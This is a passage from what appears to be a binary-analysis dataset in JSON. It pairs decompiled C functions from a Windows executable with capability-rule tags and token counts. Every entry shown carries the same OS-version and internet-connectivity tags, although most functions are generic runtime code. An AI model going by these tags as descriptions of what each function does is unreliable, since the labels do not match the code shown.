        "decompiled_code": "\nuint __cdecl fcn.00415718(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "00415800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00415833)\n\nvoid fcn.00415800(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x415855;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00406570();\n    fcn.00415760();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41585c;\n    uStack28 = 0x415854;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 166
    },
    "00415930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415930(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x4159c5;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    if (*(in_EAX + 4) == 0) {\n        fcn.00403e38();\n        param_2 = 0x4159af;\n        fcn.00405004();\n    }\n    else {\n        puStack296 = &stack0xfffffffc;\n        fcn.00404154();\n        fcn.004158f0();\n        fcn.00409c80(param_2);\n    }\n    *in_FS_OFFSET = param_2;\n    uStack300 = 0x4159cc;\n    uStack304 = 0x4159c4;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 282
    },
    "00415bac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00415bac(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x415bc8;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x415c06;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.00414fd4();\n            fcn.00403f58();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x415c0d;\n        uStack20 = 0x415c05;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00415c6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00415cd8)\n// WARNING: Removing unreachable block (ram,0x00415ce8)\n\nvoid fcn.00415c6c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed0;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x415d1a;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00403e38();\n    fcn.00405004();\n    iVar1 = fcn.00404154();\n    if (iVar1 != 0) {\n        fcn.00404154();\n        fcn.00404154();\n    }\n    *in_FS_OFFSET = in_stack_fffffed0;\n    fcn.00404dc4(0x415d21);\n    return;\n}\n",
        "token_count": 242
    },
    "00415d34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415d34(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x415d51;\n    fcn.00404df4();\n    puStack36 = 0x415d5d;\n    iVar1 = fcn.00404154();\n    if ((*param_2 == 0) && (iVar1 != 0)) {\n        puStack36 = 0x415d80;\n        iVar1 = fcn.00404198();\n        if (iVar1 != 0) {\n            puStack36 = 0x415d92;\n            fcn.00404198();\n            puStack36 = 0x415d97;\n            iVar1 = fcn.0041196c();\n            if ((iVar1 != 0) && (*(iVar1 + 8) != 0)) {\n                puStack36 = 0x415db9;\n                iVar2 = fcn.00402ce4();\n                uStack40 = 0x415e32;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.00404198();\n                fcn.00411a98();\n                iVar1 = *(iVar1 + 8);\n                if (-1 < iVar1 + -1) {\n                    iVar4 = 0;\n                    do {\n                        if (****(iVar2 + iVar4 * 4) == '\\a') {\n                            iVar3 = fcn.00411aec();\n                            if (iVar3 == in_EAX) {\n                                fcn.00405004();\n                            }\n                        }\n                        iVar4 = iVar4 + 1;\n                        iVar1 = iVar1 + -1;\n                    } while (iVar1 != 0);\n                }\n                *in_FS_OFFSET = uStack44;\n                puStack36 = 0x415e39;\n                uStack40 = 0x415e31;\n                fcn.00402d00();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 538
    },
    "00416128": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00416128(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[4] = in_EAX[4] + 1;\n    return;\n}\n",
        "token_count": 72
    },
    "004161e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004161e4(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[4] = in_EAX[4] + -1;\n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "004171f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004171f0(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 9) != '\\0') {\n        fcn.004162dc();\n    }\n    if ((in_EDX < 0) || (in_EAX[7] < in_EDX)) {\n        fcn.004162dc();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 116
    },
    "004175c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004175c8(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x004175e0:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041760a;\n            }\n            else if (arg_ch < 1) goto code_r0x0041760a;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x004175e0;\n    fcn.0040c668();\n    fcn.004047cc();\n    in_EAX = extraout_ECX;\ncode_r0x0041760a:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 210
    },
    "00417668": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00417668(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.00403e30();\n    while ((var_20h != 0 && (var_20h != *0x41307c))) {\n        var_20h = fcn.00403ee4();\n    }\n    if (var_20h == 0) {\n        fcn.0041761c(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.0041761c(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 288
    },
    "004176ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.004176ec(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041770b:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x00417735;\n            }\n            else if (arg_ch < 1) goto code_r0x00417735;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041770b;\n    fcn.0040c668();\n    fcn.004047cc();\ncode_r0x00417735:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 216
    },
    "004177cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004177cc(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x4177f1;\n        fcn.00417550(0, 0);\n        uStackY52 = 0x4177f7;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x00417825:\n            var_14h = arg_8h;\n            goto code_r0x0041782b;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x00417825;\n    var_14h = 0xf000;\ncode_r0x0041782b:\n    fcn.00402ce4();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.00402d00();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x0041785d:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x0041785d;\n        fcn.0041775c();\n        fcn.00417794();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 539
    },
    "00417a28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417a28(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x417a4b;\n        in_EAX = fcn.0040427c();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x417b70;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        in_stack_ffffffa8 = 0x80;\n        puStack72 = &fcn.00417a28::var_1h + 1;\n        uVar1 = fcn.00405264(0xc0000000, 0, 0, 2, 0x80, 0);\n        sub.kernel32.dll_CreateFileA_1(uVar1);\n        fcn.00417920();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040949c();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040bd98();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            fcn.0040c6a4(1, &fcn.00417a28::var_14h);\n            fcn.004047cc();\n        }\n    }\n    else {\n        puStack72 = &fcn.00417a28::var_1h + 1;\n        fcn.00409218();\n        fcn.00417920();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040949c();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040bd98();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040c6a4(1, &fcn.00417a28::var_14h);\n            fcn.004047cc();\n        }\n    }\n    fcn.00404df4();\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x417b77;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 718
    },
    "00417e2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417e2c(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack28 = 0x417ebe;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (*(arg_8h + 8) == '\\0') {\n        fcn.00404f98();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        fcn.00408d88();\n    }\n    var_ch = var_4h;\n    var_8h._0_1_ = 0xb;\n    arg_ch = &var_ch;\n    arg_8h_00 = 0;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h_00, arg_ch);\n    fcn.004047cc();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack32 = 0x417ec5;\n    fcn.00404da0();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 340
    },
    "00418124": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00418124(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    \n    for (pcVar2 = *(in_EAX + 0x14); (*pcVar2 != '\\0' && (*pcVar2 != '.')); pcVar2 = pcVar2 + 1) {\n    }\n    cVar1 = *pcVar2;\n    if (cVar1 != '\\0') {\n        fcn.00404e90();\n        fcn.00405304();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 130
    },
    "00418200": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418200(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4182a9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; (*param_2 != '\\0' && (1 < *param_2 - 0x2dU)); param_2 = param_2 + 1) {\n            }\n            fcn.00404e90();\n            iVar2 = fcn.0041ba2c();\n            if ((iVar2 == 0) && (cVar1 = fcn.00408b5c(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*param_2 == '.') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '-') {\n                param_2 = param_2 + 1;\n            }\n            in_EAX = iVar2;\n            if (*param_2 == '>') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4182b0;\n    uStack36 = 0x4182a8;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 405
    },
    "0041834c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041834c(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x41835f;\n    (**(**0x4962c4 + 0x14))();\n    uStack40 = 0x418508;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x418377;\n    puStack36 = &stack0xfffffffc;\n    iVar1 = fcn.004152b4();\n    uStack52 = 0x4184e9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x4184f0;\n        uStack52 = 0x4184e8;\n        fcn.00415318();\n        return;\n    }\n    puStack60 = 0x41839d;\n    puStack48 = &stack0xfffffffc;\n    fcn.00403f28();\n    uStack64 = 0x4184ca;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x4183ba;\n    puStack60 = &stack0xfffffffc;\n    fcn.00403f28();\n    uStack76 = 0x418478;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    iVar5 = 0;\n    puStack72 = &stack0xfffffffc;\ncode_r0x00418459:\n    while( true ) {\n        if (*(iVar1 + 8) <= iVar5) {\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41847f;\n            uStack76 = 0x418477;\n            fcn.00403f58();\n            return;\n        }\n        puVar2 = fcn.00414eec();\n        iVar3 = fcn.00414a30();\n        if (iVar3 != 0) break;\n        iVar4 = fcn.00411aec();\n        if (iVar4 != 0) break;\n        fcn.00418304(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    }\n    if (iVar3 != 0) {\n        if ((*(iVar3 + 0x1c) & 2) != 0) {\n            fcn.00418304(&stack0xfffffffc);\n            iVar5 = iVar5 + 1;\n            goto code_r0x00418459;\n        }\n        fcn.00418200();\n        (***puVar2)();\n    }\n    fcn.004182cc(&stack0xfffffffc);\n    fcn.00414dd8();\n    fcn.00403f58();\n    goto code_r0x00418459;\n}\n",
        "token_count": 785
    },
    "00418518": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418518(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4962e0 == 0) {\n        return;\n    }\n    puStack28 = 0x41853e;\n    iVar2 = fcn.004152b4();\n    uStack32 = 0x4185b3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.00414eec();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.00408b5c();\n                    if (cVar1 == '\\0') goto code_r0x00418595;\n                }\n                fcn.00414dd8();\n                fcn.00403f58();\n            }\ncode_r0x00418595:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4185ba;\n    uStack32 = 0x4185b2;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 386
    },
    "004185c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004185c4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x4962e0 != 0) {\n        puStack24 = 0x4185e1;\n        iVar1 = fcn.004152b4();\n        uStack28 = 0x41863b;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00414eec();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.00414dd8();\n                    fcn.00403f58();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x418642;\n        uStack28 = 0x41863a;\n        fcn.00415318();\n        return;\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "00418710": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418710(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00408b5c();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.00404da0();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0041874c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041874c(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x418768;\n    cVar1 = fcn.00408b5c();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x418783;\n        cVar1 = fcn.0041a764();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x418795;\n            fcn.0041a874();\n            *(in_EAX + 0x88) = 1;\n            puStack24 = 0x4187a4;\n            fcn.00418660();\n        }\n        puStack24 = 0x4187b0;\n        piVar2 = fcn.00403f28();\n        uStack28 = 0x418816;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00418c50();\n        (**(*piVar2 + 4))();\n        fcn.00418c50();\n        *(in_EAX + 0x88) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41881d;\n        uStack28 = 0x418815;\n        fcn.00403f58();\n        return;\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "0041886c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041886c(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    uint var_10ch;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*(in_EAX + 0x42) == 0) {\n        var_9h = '\\x01';\n    }\n    else {\n        fcn.0040503c();\n        iVar1 = fcn.004041dc();\n        *arg_8h = iVar1;\n        arg_8h[1] = var_4h;\n        var_9h = *arg_8h == 0;\n        (*in_EAX[0x10])(&var_9h, arg_8h);\n    }\n    if (var_9h != '\\0') {\n        arg_8h[1] = var_4h;\n        iVar1 = (**(*in_EAX + 0x1c))();\n        *arg_8h = iVar1;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "0041895c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
